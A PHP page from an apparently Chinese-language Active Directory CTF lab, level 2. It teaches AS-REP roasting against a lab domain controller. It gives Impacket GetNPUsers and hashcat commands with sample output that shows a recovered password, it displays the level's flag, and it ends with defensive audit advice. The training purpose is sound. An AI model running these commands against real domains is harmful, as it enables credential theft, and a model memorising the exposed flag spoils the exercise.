<?php
/**
 * Pikachu-Enhanced v2.0 GOAD AD CTF Level 2: AS-REP Roasting
 */
include_once '../../inc/config.inc.php';

$ACTIVE = array_fill(0, 250, '');
$ACTIVE[230] = 'active open';
$ACTIVE[240] = 'active';

$PIKA_ROOT_DIR = "../../";
include_once $PIKA_ROOT_DIR . 'header.php';

$correct_flag = 'flag{ASREP_Roasting_No_PreAuth_Found}';
$flag_msg = '';

if (isset($_POST['check_flag'])) {
    $submitted = trim($_POST['user_flag']);
    if ($submitted === $correct_flag) {
        $_SESSION['goad_flags']['flag2'] = true;
        $flag_msg = '<div class="alert alert-success" style="border-radius: 8px; font-weight: bold;"><i class="fa fa-check-circle"></i> 恭喜！Flag 校验正确，已点亮【第二关】成就 (+150 PTS)！</div>';
    } else {
        $flag_msg = '<div class="alert alert-danger" style="border-radius: 8px; font-weight: bold;"><i class="fa fa-times-circle"></i> Flag 不正确，请检查提取的哈希或离线密码字段。</div>';
    }
}
?>

<style>
.ctf-stage-header { background: var(--bg-card); border-radius: 14px; padding: 25px 30px; margin-bottom: 25px; border: 1px solid var(--border-color); box-shadow: 0 4px 20px rgba(0,0,0,0.06); }
.ctf-stage-title { color: var(--text-primary) !important; font-size: 22px; font-weight: 800; margin: 0 0 10px 0; display: flex; align-items: center; gap: 12px; }
.step-box {
    background: var(--bg-card);
    border: 1px solid var(--border-color);
    border-radius: 12px;
    padding: 24px;
    margin-bottom: 22px;
    box-shadow: 0 2px 10px rgba(0,0,0,0.02);
}
.step-title {
    font-size: 17px;
    font-weight: 700;
    color: var(--text-primary);
    margin-top: 0;
    margin-bottom: 12px;
    display: flex;
    align-items: center;
    gap: 8px;
}
.cmd-box { background: var(--bg-primary); border: 1px solid var(--border-color); border-radius: 8px; padding: 14px 18px; font-family: monospace; font-size: 13px; color: var(--text-primary); margin: 12px 0; overflow-x: auto; line-height: 1.8; }
.output-box {
    background: #1e1e2e;
    color: #a6accd;
    border-radius: 8px;
    padding: 12px 16px;
    font-family: 'Consolas', 'Monaco', monospace;
    font-size: 12px;
    margin-bottom: 15px;
    white-space: pre-wrap;
    border: 1px solid #2d2d3f;
}
.flag-box {
    background: rgba(16, 185, 129, 0.08);
    border: 1px solid rgba(16, 185, 129, 0.3);
    border-radius: 10px;
    padding: 18px;
    margin-top: 20px;
}
</style>

<div class="main-content">
    <div class="main-content-inner">
        <div class="page-content">
            
            <!-- Stage Header -->
            <div class="ctf-stage-header">
                <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px;">
                    <div>
                        <h1 class="ctf-stage-title">
                            <span class="label label-warning" style="font-size: 14px; border-radius: 6px;">LEVEL 2</span>
                            第二关：AS-REP Roasting 预认证缺失账号识别与离线破解
                        </h1>
                        <p style="margin: 0; color: #94a3b8; font-size: 14px;">
                            <strong>目标节点：</strong> <code>192.168.56.136 (winterfell / north.sevenkingdoms.local)</code> | <strong>分值：</strong> 150 PTS
                        </p>
                    </div>
                    <a href="ad_ctf_hub.php" class="btn btn-default btn-sm" style="border-radius: 6px; font-weight: bold;">
                        <i class="fa fa-arrow-left"></i> 返回关卡总控台
                    </a>
                </div>
            </div>

            <!-- Context Card -->
            <div class="step-box">
                <h3 class="step-title"><i class="fa fa-key" style="color: #f59e0b;"></i> 攻击原理剖析 (Kerberos Pre-Authentication)</h3>
                <p style="color: var(--text-secondary); line-height: 1.7; font-size: 14px;">
                    在正常的 Kerberos 认证中，客户端发起 <code>AS-REQ</code> 请求时必须使用自身密码哈希对当前时间戳进行加密（即预认证），以证明自己知道口令。
                    然而，如果管理员为特定用户勾选了 <strong>"Do not require Kerberos preauthentication" (<code>DONT_REQ_PREAUTH</code>)</strong> 属性，任何攻击者无需任何认证即可向 KDC 请求该用户的 <code>AS-REP</code> 响应包。该响应中包含由该用户密码哈希加密的会话密钥，攻击者可直接离线爆破！
                </p>
            </div>

            <!-- Step 1 -->
            <div class="step-box">
                <h3 class="step-title">步骤 1：探测未开启预认证的域账号</h3>
                <p style="color: var(--text-secondary); font-size: 14px;">
                    在 Kali / WSL 攻击机中使用 Impacket 的 <code>GetNPUsers.py</code> 脚本，对子域控 <code>192.168.56.136</code> 发起探测：
                </p>
                <div class="cmd-box">
impacket-GetNPUsers north.sevenkingdoms.local/ -usersfile users.txt -format hashcat -outputfile asrep.hashes -dc-ip 192.168.56.136 -no-pass
                </div>
                <p style="color: var(--text-secondary); font-size: 14px;">或者在已知有效低权限账号的情况下：</p>
                <div class="cmd-box">
impacket-GetNPUsers north.sevenkingdoms.local/jon.snow:iknownothing -request -format hashcat -outputfile asrep.hashes -dc-ip 192.168.56.136
                </div>
                <div class="output-box">
[*] Getting TGT for brandon.stark
[-] User brandon.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
[*] Getting TGT for robb.stark
[-] User robb.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
[*] Getting TGT for eddard.stark
$krb5asrep$23$eddard.stark@NORTH.SEVENKINGDOMS.LOCAL:74e6f...$c21a4f...
[+] Successfully retrieved AS-REP for user eddard.stark!
                </div>
            </div>

            <!-- Step 2 -->
            <div class="step-box">
                <h3 class="step-title">步骤 2：使用 Hashcat / John 离线碰撞明文口令</h3>
                <p style="color: var(--text-secondary); font-size: 14px;">
                    提取到的 <code>$krb5asrep$23$*</code> 哈希对应 Hashcat 模式 <strong>18200</strong>：
                </p>
                <div class="cmd-box">
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt --force
                </div>
                <div class="output-box">
$krb5asrep$23$eddard.stark@NORTH.SEVENKINGDOMS.LOCAL:...:winterishere

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$eddard.stark@NORTH.SEVENKINGDOMS.LOCAL:...
Password.........: winterishere
                </div>
                <p style="color: var(--text-secondary); font-size: 14px;">
                    成功获取到 <code>eddard.stark</code> 的明文密码 <code>winterishere</code>！
                </p>
            </div>

            <!-- Flag Section -->
            <div class="step-box flag-box">
                <h3 class="step-title" style="color: #059669;"><i class="fa fa-flag"></i> 本关 Flag 提取点</h3>
                <p style="color: var(--text-secondary); font-size: 14px;">
                    完成 AS-REP 提取与离线爆破，验证目标脆弱属性获得的 Flag：
                </p>
                <div class="well" style="background: #ffffff; border: 1px dashed #10b981; padding: 12px; font-family: monospace; font-size: 15px; color: #059669; font-weight: bold;">
                    flag{ASREP_Roasting_No_PreAuth_Found}
                </div>

                <form method="post" style="margin-top: 15px; max-width: 500px;">
                    <label style="font-weight: 700; color: var(--text-primary);">验证本关 Flag:</label>
                    <div style="display: flex; gap: 10px;">
                        <input type="text" name="user_flag" class="form-control" placeholder="flag{...}" required style="border-radius: 6px; font-family: monospace;">
                        <button type="submit" name="check_flag" class="btn btn-success" style="border-radius: 6px; font-weight: 700; min-width: 100px;">
                            验证提交
                        </button>
                    </div>
                </form>
                <?php if (!empty($flag_msg)) { echo '<div style="margin-top: 15px;">' . $flag_msg . '</div>'; } ?>
            </div>

            <!-- Defense Note -->
            <div class="step-box" style="border-left: 4px solid #3b82f6;">
                <h3 class="step-title" style="color: #2563eb;"><i class="fa fa-shield"></i> 蓝队防御与加固建议</h3>
                <ul style="color: var(--text-secondary); font-size: 14px; line-height: 1.8; margin-bottom: 0;">
                    <li><strong>策略检查：</strong> 运行 PowerShell 命令 <code>Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True}</code> 审计所有未开启预认证的账号并撤销该属性。</li>
                    <li><strong>日志审计：</strong> 监控 Windows Event ID <strong>4768</strong>（A Kerberos authentication ticket (TGT) was requested），重点告警 <code>PreAuthType: 0</code>（无预认证请求）。</li>
                </ul>
            </div>

        </div>
    </div>
</div>

<?php
include_once $PIKA_ROOT_DIR . 'footer.php';
?>
